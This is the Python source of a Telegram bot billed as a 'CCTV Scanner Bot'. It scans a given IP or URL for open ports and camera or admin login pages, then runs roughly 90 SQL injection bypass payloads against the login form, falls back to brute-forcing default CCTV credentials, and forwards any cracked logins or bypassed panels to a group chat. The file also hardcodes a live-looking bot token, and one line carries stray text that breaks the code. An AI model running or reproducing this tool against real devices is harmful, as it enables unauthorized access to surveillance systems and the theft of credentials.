import os
import asyncio
import socket
import logging
import re
import base64
from urllib.parse import urlparse, urljoin
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)
from aiohttp import ClientSession, ClientTimeout, ClientError
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.DEBUG
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT, CHECK_LINK = range(3)

# Environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

# Common ports
COMMON_PORTS = [80, 443, 8080, 8443]

# Common login paths
LOGIN_PATHS = ["/login", "/admin", "/login.php", "/admin/login", "/web", "/auth", "/signin", "/default.html"]

# Common CCTV credentials (for brute force)
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("admin", "666666"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "12345"),
    ("user", "12345"),
]

# SQL injection payloads (90+)
SQL_PAYLOADS = [
    "' OR '1'='1", "admin' --", "admin' #", "' OR ''='", "admin' OR '1'='1",
    "' OR 1=1--", "' OR 'a'='a", "') OR ('1'='1", "' OR 1=1#", "admin' OR 1=1--",
    "1' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "admin' OR 'a'='a",
    "' OR '1'='1'/*", "admin'/*", "admin'*/", "' OR 1=1/*", "admin' OR 1=1/*",
    "') OR '1'='1", "' OR '1'='1' OR ''='", "admin' OR ''='", "' OR 1=1 LIMIT 1--",
    "' OR 1=1 AND 1=1--", "admin' AND 1=2--", "' OR 1=1 ORDER BY 1--",
    "') OR ('1'='1')--", "' OR '1'='1' AND 'a'='a--", "admin' OR 1=1 LIMIT 1 OFFSET 0--",
    "' OR SLEEP(3)--", "' OR IF(1=1,SLEEP(3),0)--", "admin' AND SLEEP(3)--",
    "' OR (SELECT SLEEP(3))--", "' OR 1=1 AND (SELECT SLEEP(3) FROM dual)--",
    "' OR BENCHMARK(2000000,MD5(1))--", "admin' OR SLEEP(3) AND '1'='1--",
    "' OR 1=1 AND SLEEP(3) LIMIT 1--", "' OR IF((SELECT 1)=1,SLEEP(3),0)--",
    "' OR 1=1 AND IF(1=1,SLEEP(3),0)--", "' OR SLEEP(3) AND '1'='1'--",
    "' OR SLEEP(4)--", "' OR IF(1=1,SLEEP(4),0)--", "admin' AND SLEEP(4)--",
    "' UNION SELECT NULL, NULL--", "' UNION SELECT 1, 2--",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT 1, concat(username, ':', password) FROM users--",
    "' UNION SELECT 1, version()--", "' UNION SELECT 1, user()--",
    "' UNION SELECT 1, database()--", "' UNION SELECT 1, @@version--",
    "' UNION SELECT 1, table_name FROM information_schema.tables--",
    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "admin' UNION SELECT NULL, concat(username, ':', password) FROM users--",
    "' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT 1, 2, 3--",
    "' OR 1=1 AND (SELECT 1 FROM users WHERE 1=1)--",
    "admin' AND (SELECT password FROM users WHERE username='admin')--",
    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' OR 1=1 AND (SELECT 1/0 FROM dual)--",
    "' OR 1=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
    "' OR 1=1 AND FLOOR(RAND(0)*2)--",
    "'; SELECT 1--", "'; SELECT SLEEP(3)--", "admin'; SELECT username FROM users--",
    "'; INSERT INTO users (username, password) VALUES ('test', 'test')--",
    "' OR 'admin'='admin'--", "admin' OR 'root'='root'--", "' OR 'guest'='guest'--",
    "' OR '1'='1' AND user='admin'--", "admin' OR user='admin'--",
    "' OR '1'='1' AND username='admin'--", "admin' OR username='admin'--",
    "' OR '1'='1' AND login='admin'--", "admin' OR login='admin'--",
    "admin' AND 1=1--", "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
    "' OR '1'='1' AND user_id='admin'--", "admin' OR user_id='admin'--"
]

# Custom headers
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "http://example.com"
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    logger.debug("Starting /start command")
    keyboard = [
        [InlineKeyboardButton("🔍 Start Scan", callback_data="start_hack"),
         InlineKeyboardButton("🔗 Check Link", callback_data="check_link")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    await update.message.reply_text(
        "🌐 **CCTV Scanner Bot** 🌐\n"
        "Scan for CCTV systems or admin panels.\n"
        "Select an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return IP

async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    logger.debug("Starting /hack command")
    keyboard = [
        [InlineKeyboardButton("🔐 SQL Injection", callback_data="sql_injection"),
         InlineKeyboardButton("🔗 Check Link", callback_data="check_link")],
        [InlineKeyboardButton("🔍 Standard Scan", callback_data="start_hack"),
         InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    await update.message.reply_text(
        "🔥 **Advanced Scanning Options** 🔥\n"
        "- *SQL Injection*: Bypass login with SQL payloads\n"
        "- *Standard Scan*: Check common paths\n"
        "- *Check Link*: Verify a specific URL\n"
        "Choose an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return IP

async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    context.user_data["scan_type"] = "standard"
    await query.message.reply_text("📡 Enter IP address (e.g., 192.168.1.1):")
    return IP

async def sql_injection_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    context.user_data["scan_type"] = "sql_injection"
    await query.message.reply_text("📡 Enter URL for SQL injection (e.g., http://192.168.8.20:80/login):")
    return CHECK_LINK

async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    await query.message.reply_text("🔗 Provide a URL to check (e.g., http://192.168.8.20:80/login):")
    return CHECK_LINK

async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "📚 **CCTV Scanner Bot - Help**\n"
        "1. **/start**: Start scanning or check a URL\n"
        "2. **/hack**: Advanced scanning options\n"
        "3. **Check Link**: Scan a specific URL\n"
        "4. **Standard Scan**: Scans common paths\n"
        "5. **SQL Injection**: Bypass login forms\n"
        "6. **/cancel**: Stop operation\n"
        "7. **/status**: Check bot status\n"
        "⚠️ **Use ethically and legally!**",
        parse_mode="Markdown"
    )

async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    url = update.message.text.strip()
    logger.debug(f"Checking URL: {url}")
    scan_type = context.user_data.get("scan_type", "check_link")
    try:
        parsed_url = urlparse(url)
        ip = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        path = parsed_url.path or "/"

        if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
            await update.message.reply_text("❌ Invalid IP! Use IPv4 (e.g., 192.168.1.1).")
            return CHECK_LINK

        if not await check_port(ip, port):
            await update.message.reply_text(f"❌ Port {port} is closed on {ip}.")
            return ConversationHandler.END

        if scan_type == "sql_injection":
            results = await sql_injection(url, update, context)
            result_text = "\n".join(results)
            await update.message.reply_text(f"📊 SQL Injection Results:\n{result_text}", parse_mode="Markdown")
            if GROUP_CHAT_ID:
                await context.bot.send_message(
                    GROUP_CHAT_ID, f"📊 SQL Injection Results for {url}:\n{result_text}", parse_mode="Markdown"
                )
        else:
            is_admin, details, company = await check_admin_panel(url)
            panel_name = path.strip("/") or "root"

            if is_admin:
                keyboard = [[InlineKeyboardButton(f"🌐 Visit {panel_name}", url=url)]]
                await update.message.reply_text(
                    f"✅ **Admin Panel Found**: {panel_name} 🎯\n"
                    f"URL: {url}\n"
                    f"Company: {company}\n"
                    f"Details: {', '.join(details)}",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="Markdown"
                )
                if GROUP_CHAT_ID:
                    await context.bot.send_message(
                        GROUP_CHAT_ID,
                        f"✅ **Admin Panel** for {ip}:{port}!\nURL: {url}\nCompany: {company}\nDetails: {', '.join(details)}",
                        parse_mode="Markdown"
                    )
            else:
                await update.message.reply_text(
                    f"❌ No admin panel at {url}.\nCompany: {company}\nDetails: {', '.join(details)}",
                    parse_mode="Markdown"
                )

        return ConversationHandler.END

    except Exception as e:
        logger.error(f"URL check error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")
        return CHECK_LINK

async def check_admin_panel(url: str) -> tuple[bool, list, str]:
    details = []
    company = "Unknown"
    try:
        async with ClientSession(timeout=ClientTimeout(total=10)) as session:
            async with session.get(url, headers=HEADERS, ssl=False, allow_redirects=True) as response:
                status = response.status
                html = await response.text()
                headers = response.headers

                # Parse HTML with BeautifulSoup for company detection
                soup = BeautifulSoup(html, "html.parser")
                title = soup.title.string if soup.title else ""
                meta = soup.find("meta", {"name": ["description", "author", "generator", "keywords"]})
                meta_content = meta.get("content", "") if meta else ""
                scripts = soup.find_all("script")
                script_content = " ".join(script.get_text() for script in scripts)
                for source in [title, meta_content, html, script_content]:
                    for brand in ["Hikvision", "Dahua", "Axis", "Bosch", "Vivotek", "Generic CCTV", "ZKTeco", "Reolink"]:
                        if brand.lower() in source.lower():
                            company = brand
                            break
                    if company != "Unknown":
                        break

                # Detection logic from bot1 (22).py
                is_admin = False
                if re.search(r'<form.*?(username|login|email|password|user|pass).*?>', html, re.I | re.S):
                    is_admin = True
                    details.append("Login form detected")
                keywords = ["username", "password", "login", "admin", "dashboard", "control panel", "sign in", "user", "pass"]
                if any(keyword in html.lower() for keyword in keywords):
                    is_admin = True
                    details.append("Admin keywords found")
                server = headers.get("Server", "").lower()
                powered_by = headers.get("X-Powered-By", "").lower()
                if any(sig in server or sig in powered_by for sig in ["apache", "nginx", "wordpress"]):
                    details.append(f"Server: {server or powered_by}")
                if status in [401, 403]:
                    details.append("Unauthorized/Forbidden")
                    is_admin = True

                return is_admin, details or ["No admin indicators"], company
    except ClientError as e:
        return False, [f"Network error: {str(e)}"], company
    except Exception as e:
        return False, [f"Error: {str(e)}"], company

async def get_form_fields(html: str) -> tuple[dict, str, str]:
    try:
        soup = BeautifulSoup(html, "html.parser")
        form = soup.find("form")
        if not form:
            return {}, None, None
        inputs = form.find_all("input")
        form_data = {inp.get("name"): inp.get("value", "") for inp in inputs if inp.get("name")}
        username_field = next((name for name in form_data if name.lower() in [
            "username", "user", "login", "email", "name", "loginid", "userid", "user_id", "uname", "userName"
        ]), None)
        password_field = next((name for name in form_data if name.lower() in [
            "password", "pass", "pwd", "passwd", "passcode", "passWord"
        ]), None)
        return form_data, username_field, password_field
    except Exception as e:
        logger.error(f"Error parsing form: {e}")
        return {}, None, None

async def check_success(response, html: str, session: ClientSession) -> bool:
    try:
        if response.status in [200, 302]:
            soup = BeautifulSoup(html, "html.parser")
            if not soup.find("form") or not re.search(r'login|sign in|invalid|error|unauthorized', html, re.IGNORECASE):
                return True
            if re.search(r'dashboard|welcome|control panel|admin|settings|manage|overview|main', html, re.IGNORECASE):
                return True
            if response.url.path in ["/dashboard", "/admin", "/home", "/panel", "/settings", "/manage", "/control", "/main"]:
                return True
            if any(cookie in response.cookies for cookie in ["session", "auth", "PHPSESSID", "JSESSIONID", "token"]):
                return True
            if response.content_type == "application/json":
                json_data = await response.json()
                if any(key in json_data for key in ["success", "authenticated", "status"]) and json_data.get(key, False):
                    return True
            if response.status == 302 and response.headers.get("Location"):
                async with session.get(response.headers["Location"], headers=HEADERS, ssl=False, timeout=10) as redirect_response:
                    redirect_html = await redirect_response.text()
                    if re.search(r'dashboard|admin|settings|manage|overview|main', redirect_html, re.IGNORECASE):
                        return True
    except Exception as e:
        logger.error(f"Error checking success: {e}")
    return False

async def sql_injection(url: str, update: Update, context: ContextTypes.DEFAULT_TYPE) -> list:
    results = []
    urls_to_check = [url] + [urljoin(url, path) for path in LOGIN_PATHS]
    semaphore = asyncio.Semaphore(5)

    async def try_url(check_url: str) -> list:
        try:
            async with ClientSession(timeout=ClientTimeout(total=10)) as session:
                async with session.get(check_url, headers=HEADERS, ssl=False, allow_redirects=True) as response:
                    html = await response.text()
                    is_admin, details, company = await check_admin_panel(check_url)
                    if not is_admin:
                        return [f"❌ No login form detected at {check_url}. Company: {company}. Details: {', '.join(details)}"]

                    detection_message = f"✅ Login panel detected at {check_url}. Company: {company}"
                    await update.message.reply_text(detection_message, parse_mode="Markdown")
                    if GROUP_CHAT_ID:
                        await context.bot.send_message(GROUP_CHAT_ID, detection_message, parse_mode="Markdown")

                    form_data, username_field, password_field = await get_form_fields(html)
                    if not username_field or not password_field:
                        return [f"❌ No valid login form fields at {check_url}. Company: {company}"]

                    total_payloads = len(SQL_PAYLOADS)
                    progress_message = await update.message.reply_text(
                        f"🔄 Starting SQL Injection on {check_url}\nProgress: 0/{total_payloads} payloads",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
                    )
                    context.user_data["progress_message_id"] = progress_message.message_id

                    for i, payload in enumerate(SQL_PAYLOADS, 1):
                        try:
                            async with semaphore:
                                for field in [username_field, password_field]:
                                    data = form_data.copy()
                                    data[field] = payload
                                    if field != password_field:
                                        data[password_field] = "test"
                                    if field != username_field:
                                        data[username_field] = "admin"
                                    async with session.post(check_url, data=data, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
                                        html = await response.text()
                                        if await check_success(response, html, session):
                                            direct_url = response.url if response.url.path != "/login" else f"{check_url.replace('/login', '')}/dashboard"
                                            result = f"✅ Bypassed! Payload: {payload} (Field: {field})\n[🌐 Visit {direct_url}]"
                                            results.append(result)
                                            await context.bot.delete_message(
                                                chat_id=update.effective_chat.id,
                                                message_id=progress_message.message_id
                                            )
                                            return results
                                        cred_match = re.search(r'username:.*?(\w+).*?password:.*?(\w+)', html, re.IGNORECASE)
                                        if cred_match:
                                            results.append(f"✅ Credentials Found: Username: {cred_match.group(1)}, Password: {cred_match.group(2)}")
                                await asyncio.sleep(0.6)
                                if i % 5 == 0 or i == total_payloads:
                                    try:
                                        await context.bot.edit_message_text(
                                            chat_id=update.effective_chat.id,
                                            message_id=progress_message.message_id,
                                            text=f"🔄 SQL Injection on {check_url}\nProgress: {i}/{total_payloads} payloads",
                                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
                                        )
                                    except Exception as e:
                                        logger.error(f"Progress update error: {e}")
                        except ClientError as e:
                            logger.error(f"Network error on payload {payload}: {e}")
                            continue
                        except Exception as e:
                            logger.error(f"SQL injection error on payload {payload}: {e}")
                            continue

                    # Brute force fallback
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=progress_message.message_id,
                        text=f"🔄 SQL Injection failed. Trying Brute Force on {check_url}\nProgress: 0/{len(CREDENTIALS)} combinations"
                    )
                    total_combinations = len(CREDENTIALS)
                    for i, (username, password) in enumerate(CREDENTIALS, 1):
                        try:
                            async with semaphore:
                                data = form_data.copy()
                                data[username_field] = username
                                data[password_field] = password
                                async with session.post(check_url, data=data, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
                                    html = await response.text()
                                    if await check_success(response, html, session):
                                        direct_url = f"{check_url.replace('/login', '')}/dashboard"
                                        result = f"✅ Cracked! Username: {username}, Password: {password}\n[🌐 Visit {direct_url}]"
                                        results.append(result)
                                        await context.bot.delete_message(
                                            chat_id=update.effective_chat.id,
                                            message_id=progress_message.message_id
                                        )
                                        return results
                                await asyncio.sleep(0.6)
                                if i % 5 == 0 or i == total_combinations:
                                    try:
                                        await context.bot.edit_message_text(
                                            chat_id=update.effective_chat.id,
                                            message_id=progress_message.message_id,
                                            text=f"🔄 Brute Force on {check_url}\nProgress: {i}/{total_combinations} combinations",
                                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
                                        )
                                    except Exception as e:
                                        logger.error(f"Progress update error: {e}")
                        except ClientError as e:
                            logger.error(f"Network error in brute force: {e}")
                            continue
                        except Exception as e:
                            logger.error(f"Brute force error: {e}")
                            continue

                    await context.bot.delete_message(
                        chat_id=update.effective_chat.id,
                        message_id=progress_message.message_id
                    )
                    return results or [f"❌ No bypass found at {check_url}. Company: {company}"]
        except ClientError as e:
            return [f"❌ Network error at {check_url}: {str(e)}"]
        except Exception as e:
            return [f"❌ Error at {check_url}: {str(e)}"]

    for check_url in urls_to_check:
        url_results = await try_url(check_url)
        results.extend(url_results)
        if any("Bypassed" in r or "Cracked" in r for r in url_results):
            break

    return results or ["❌ No login form detected in provided URL or common paths."]

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ip = update.message.text.strip()
    logger.debug(f"Received IP: {ip}")
    if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
        await update.message.reply_text("❌ Invalid IP! Use IPv4 (e.g., 192.168.1.1).")
        return IP
    context.user_data["ip"] = ip
    await update.message.reply_text("📡 Enter port (e.g., 80, 8443) or leave blank for common ports:")
    return PORT

async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ip = context.user_data.get("ip")
    port_input = update.message.text.strip()
    scan_type = context.user_data.get("scan_type", "standard")
    logger.debug(f"Received port: {port_input}, scan_type: {scan_type}")

    ports_to_scan = COMMON_PORTS
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
            ports_to_scan = [port]
        except ValueError:
            await update.message.reply_text("❌ Invalid port! Use 1-65535 or leave blank.")
            return PORT

    results = []
    admin_pages = []
    inline_buttons = []

    for port in ports_to_scan:
        port_results, port_admin_pages = await hack_cctv(ip, port, scan_type, update, context)
        results.append(port_results)
        admin_pages.extend(port_admin_pages)
        for admin_url in port_admin_pages:
            inline_buttons.append([
                InlineKeyboardButton(f"🌐 Visit {admin_url.split('/')[-1] or 'root'}", url=admin_url)
            ])

    reply_markup = InlineKeyboardMarkup(inline_buttons)
    results_text = "\n\n".join(results)
    await update.message.reply_text(results_text, reply_markup=reply_markup, parse_mode="Markdown")

    if admin_pages:
        await update.message.reply_text(
            "✅ **Live Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages]),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ No live admin pages found.", parse_mode="Markdown")

    if GROUP_CHAT_ID:
        group_message = f"Results for {ip}\n\n{results_text}"
        if admin_pages:
            group_message += "\n✅ **Live Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages])
        else:
            group_message += "\n❌ No live admin pages found."
        await context.bot.send_message(GROUP_CHAT_ID, group_message, parse_mode="Markdown")

    context.user_data["admin_pages"] = admin_pages
    return ConversationHandler.END

async def hack_cctv(ip: str, port: int, scan_type: str, update: Update, context: ContextTypes.DEFAULT_TYPE) -> tuple[str, list]:
    results = [f"📡 Scanning {ip}:{port} ({scan_type})..."]
    admin_pages = []
    semaphore = asyncio.Semaphore(5)

    if not await check_port(ip, port):
        results.append("❌ Port closed.")
        return "\n".join(results), admin_pages

    results.append(f"✅ Port {port} open!")
    service = "http" if port in [80, 443, 8080, 8443] else "rtsp"
    results.append(f"Service: {service}")

    async def check_path(protocol: str, path: str) -> tuple[bool, str, list, str]:
        async with semaphore:
            url = f"{protocol}://{ip}:{port}{path}"
            logger.debug(f"Checking path: {url}")
            is_admin, details, company = await check_admin_panel(url)
            return is_admin, url, details, company

    if service == "http" and scan_type == "standard":
        protocols = ["http", "https"] if port in [443, 8443] else ["http"]
        paths_to_check = LOGIN_PATHS
        total_paths = len(paths_to_check) * len(protocols)
        checked_paths = 0

        progress_message = await update.message.reply_text("🔄 Starting scan...")
        progress_button = await update.message.reply_text(
            "Progress: 0%",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Progress: 0%", callback_data="progress_dummy")]])
        )

        tasks = [check_path(protocol, path) for protocol in protocols for path in paths_to_check]
        for i in range(0, len(tasks), 5):
            batch = tasks[i:i+5]
            responses = await asyncio.gather(*batch, return_exceptions=True)
            for response in responses:
                if isinstance(response, Exception):
                    continue
                is_admin, url, details, company = response
                checked_paths += 1
                if is_admin:
                    admin_pages.append(url)
                    results.append(f"✅ **Live Path** 🎯: {url} (Company: {company}, Details: {', '.join(details)})")
                if checked_paths % 5 == 0 or checked_paths == total_paths:
                    progress = (checked_paths / total_paths) * 100
                    try:
                        await context.bot.edit_message_text(
                            chat_id=progress_message.chat_id,
                            personally identifiable information message_id=progress_message.message_id,
                            text=f"🔄 Scanning: {checked_paths}/{total_paths} paths"
                        )
                        await context.bot.edit_message_reply_markup(
                            chat_id=progress_button.chat_id,
                            message_id=progress_button.message_id,
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"Progress: {progress:.0f}%", callback_data="progress_dummy")]])
                        )
                    except Exception as e:
                        logger.error(f"Progress update error: {e}")

        await context.bot.edit_message_text(
            chat_id=progress_message.chat_id,
            message_id=progress_message.message_id,
            text=f"✅ Scan complete: {checked_paths}/{total_paths} paths"
        )
        await context.bot.edit_message_reply_markup(
            chat_id=progress_button.chat_id,
            message_id=progress_button.message_id,
            reply_markup=None
        )

        results.append(f"Paths Checked: {len(admin_pages)}/{total_paths}")

    if not admin_pages:
        results.append("❌ No live paths found.")
    results.append("⚠️ Use ethically and legally.")
    return "\n".join(results), admin_pages

async def check_port(ip: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception as e:
        logger.error(f"Port check error: {e}")
        return False

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    if context.user_data.get("progress_message_id"):
        try:
            await context.bot.delete_message(
                chat_id=update.effective_chat.id,
                message_id=context.user_data["progress_message_id"]
            )
        except:
            pass
    await update.message.reply_text("🛑 Operation cancelled. Use /start or /hack to begin again.")
    return ConversationHandler.END

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    context.user_data.clear()
    await update.message.reply_text("✅ Bot is online! Use /start or /hack to scan.")

async def keep_alive():
    import http.server
    import socketserver
    try:
        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/health":
                    self.send_response(200)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"OK")
                else:
                    self.send_response(404)
                    self.end_headers()
        server = socketserver.TCPServer(("", KEEP_ALIVE_PORT), Handler)
        logger.info(f"Keep-alive server started on port {KEEP_ALIVE_PORT}")
        server.serve_forever()
    except Exception as e:
        logger.error(f"Keep-alive error: {e}")

def run_keep_alive(loop):
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(keep_alive())
    except Exception as e:
        logger.error(f"run_keep_alive error: {e}")

def main() -> None:
    logger.info("Initializing bot...")
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
            CallbackQueryHandler(sql_injection_callback, pattern="^sql_injection$"),
            CallbackQueryHandler(check_link_callback, pattern="^check_link$"),
        ],
        states={
            IP: [MessageHandler(filters.TEXT & ~filters.COMMAND, ip)],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
            CHECK_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CommandHandler("start", start),
            CommandHandler("hack", hack),
            CommandHandler("status", status),
            CallbackQueryHandler(cancel, pattern="^cancel_sql$"),
        ],
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hack", hack))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CallbackQueryHandler(help_callback, pattern="^help$"))
    application.add_handler(conv_handler)

    import threading
    keep_alive_loop = asyncio.new_event_loop()
    threading.Thread(target=run_keep_alive, args=(keep_alive_loop,), daemon=True).start()

    logger.info("Starting bot polling...")
    application.run_polling()

if __name__ == "__main__":
    main()
